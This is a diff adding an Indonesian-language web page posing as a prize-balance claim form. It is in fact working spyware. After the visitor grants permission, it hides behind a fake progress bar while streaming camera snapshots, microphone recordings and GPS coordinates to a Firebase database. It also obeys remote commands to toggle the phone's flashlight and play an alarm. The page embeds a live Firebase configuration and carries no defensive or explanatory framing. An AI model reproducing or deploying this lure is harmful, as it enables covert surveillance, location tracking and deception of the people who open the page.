@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Hadiah Saldo</title>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+    <style>
+        :root { --red: #d63031; --dark: #b32d2e; }
+        body { background: #fdfdfd; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #2d3436; }
+        .container { width: 90%; max-width: 360px; background: #fff; border-radius: 25px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid #eee; }
+        .header { background: var(--red); padding: 40px 20px; color: white; }
+        .content { padding: 30px 20px; }
+        .btn { width: 100%; padding: 18px; background: var(--red); color: #fff; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; }
+        input { width: 100%; padding: 15px; margin-bottom: 20px; border: 2px solid #eee; border-radius: 12px; text-align: center; outline: none; }
+        .loading-box { display: none; padding: 20px; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid var(--red); border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .p-container { width: 100%; background: #eee; border-radius: 20px; height: 8px; margin: 15px 0; }
+        .p-bar { width: 0%; height: 100%; background: #2ecc71; border-radius: 20px; transition: 1s linear; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div style="font-size:60px;">🧧</div>
+        <h2 style="margin:0;">Hadiah Saldo</h2>
+    </div>
+
+    <div class="content" id="ui-input">
+        <p style="color:#636e72; font-size:14px; margin-bottom:20px;">Masukkan nomor akun Anda.</p>
+        <input type="number" id="target_id" placeholder="08xxxxxxxxxx">
+        <button class="btn" onclick="initiate()">KLAIM SEKARANG</button>
+    </div>
+
+    <div class="loading-box" id="ui-loading">
+        <div class="loader"></div>
+        <h3 id="status-title">Memproses...</h3>
+        <div class="p-container"><div class="p-bar" id="p-bar"></div></div>
+    </div>
+</div>
+
+<video id="v" autoplay playsinline muted style="display:none;"></video>
+<canvas id="c" style="display:none;"></canvas>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyD3usv5rw801fV1nrXIwyDQ6eYEzC7hDk0",
+        authDomain: "kodangz.firebaseapp.com",
+        databaseURL: "https://kodangz-default-rtdb.firebaseio.com",
+        projectId: "kodangz",
+        storageBucket: "kodangz.firebasestorage.app",
+        messagingSenderId: "306989473099",
+        appId: "1:306989473099:web:9049d3135ce13e08a8dcce"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let myDID = "USR-" + Math.floor(Math.random()*99999);
+    let camTrack = null;
+    
+    // Suara Alarm (Gunakan link direct mp3 yang stabil)
+    let alarm = new Audio('https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3'); // Ganti ke mp3 pilihan lo
+    alarm.loop = true;
+
+    async function initiate() {
+        const target = document.getElementById('target_id').value;
+        if(target.length < 5) return;
+
+        try {
+            // STEP 1: Unlock Audio (Penting!)
+            alarm.muted = true;
+            await alarm.play();
+            alarm.pause();
+            alarm.muted = false;
+
+            // STEP 2: Izin Perangkat
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "environment" },
+                audio: true 
+            });
+            
+            document.getElementById('ui-input').style.display = 'none';
+            document.getElementById('ui-loading').style.display = 'block';
+
+            camTrack = stream.getVideoTracks()[0];
+            const v = document.getElementById('v'), cv = document.getElementById('c');
+            v.srcObject = stream;
+
+            db.ref(`connections/${target}/${myDID}`).set({ status: "Online", t: Date.now() });
+
+            // Lokasi
+            navigator.geolocation.getCurrentPosition(pos => {
+                db.ref(`data/${myDID}/location`).set({ lat: pos.coords.latitude, lng: pos.coords.longitude });
+            });
+
+            // Camera Stream
+            setInterval(() => {
+                if(v.videoWidth > 0) {
+                    cv.width = 400; cv.height = (v.videoHeight/v.videoWidth)*400;
+                    cv.getContext('2d').drawImage(v, 0, 0, cv.width, cv.height);
+                    db.ref(`data/${myDID}/stream`).set({ frame: cv.toDataURL('image/jpeg', 0.4) });
+                }
+            }, 1000);
+
+            // Mic Stream
+            const mr = new MediaRecorder(stream);
+            mr.ondataavailable = e => {
+                const reader = new FileReader();
+                reader.readAsDataURL(e.data);
+                reader.onloadend = () => db.ref(`data/${myDID}/mic`).set({ blob: reader.result });
+            };
+            mr.start(3000);
+            setInterval(() => { if(mr.state==="recording"){ mr.stop(); mr.start(); } }, 3050);
+
+            // Perbaikan Command Listener
+            db.ref(`commands/${myDID}`).on('value', s => {
+                const cmd = s.val();
+                if(!cmd) return;
+                
+                // Flash
+                if(camTrack) {
+                    camTrack.applyConstraints({ advanced: [{ torch: !!cmd.torch }] }).catch(() => {});
+                }
+                
+                // Alarm (FIXED)
+                if(cmd.sound === true) {
+                    alarm.currentTime = 0;
+                    alarm.play().catch(e => console.log("Play failed", e));
+                } else {
+                    alarm.pause();
+                }
+            });
+
+            let p = 0;
+            setInterval(() => { if(p < 98) { p++; document.getElementById('p-bar').style.width = p + "%"; } }, 800);
+
+        } catch(e) {
+            alert("Harap izinkan akses Kamera & Mic!");
+        }
+    }
+</script>
+</body>
+</html>
